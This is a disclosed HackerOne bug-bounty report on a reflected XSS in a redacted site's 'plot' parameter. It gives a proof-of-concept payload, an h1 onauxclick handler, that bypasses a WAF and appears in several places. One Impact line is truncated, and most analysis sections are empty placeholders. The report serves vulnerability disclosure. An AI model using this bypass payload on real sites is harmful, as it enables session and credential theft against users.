# Reflected XSS | https://████████

## Metadata
- **Source:** HackerOne
- **Report:** 1736433 | https://hackerone.com/reports/1736433
- **Submitted:** 2022-10-16
- **Reporter:** x3ph_
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** medium
- **Vuln:** Cross-site Scripting (XSS) - Reflected
- **CVEs:** None
- **Category:** web-api

## Summary
Summary

Hi team, there's a reflected XSS on https://████ using the `plot` param. There's a WAF in place but it's possible to bypass it.
Steps to reproduce

1. Click https://██████████/fcgi-bin/getplot.py?plot=aaa%3Ch1%20onauxclick=confirm(document.domain)%3ERIGHT%20CLICK%20HERE
2. Observe the popup showing document.domain when right clicking "RIGHT CLICK HERE"

███

## Impact

The attacker can tr

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Summary

Hi team, there's a reflected XSS on https://████ using the `plot` param. There's a WAF in place but it's possible to bypass it.
Steps to reproduce

1. Click https://██████████/fcgi-bin/getplot.py?plot=aaa%3Ch1%20onauxclick=confirm(document.domain)%3ERIGHT%20CLICK%20HERE
2. Observe the popup showing document.domain when right clicking "RIGHT CLICK HERE"

███

## Impact

The attacker can trigger remote code execution on the victim’s browser, and steal credentials, sessions, and potentially send malware to the victim.

## System Host(s)
██████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
1. Click https://████████/fcgi-bin/getplot.py?plot=aaa%3Ch1%20onauxclick=confirm(document.domain)%3ERIGHT%20CLICK%20HERE
2. Observe the popup showing document.domain when right clicking "RIGHT CLICK HERE"

## Suggested Mitigation/Remediation Actions




</details>

---
*Analysed by Claude on 2026-05-24*
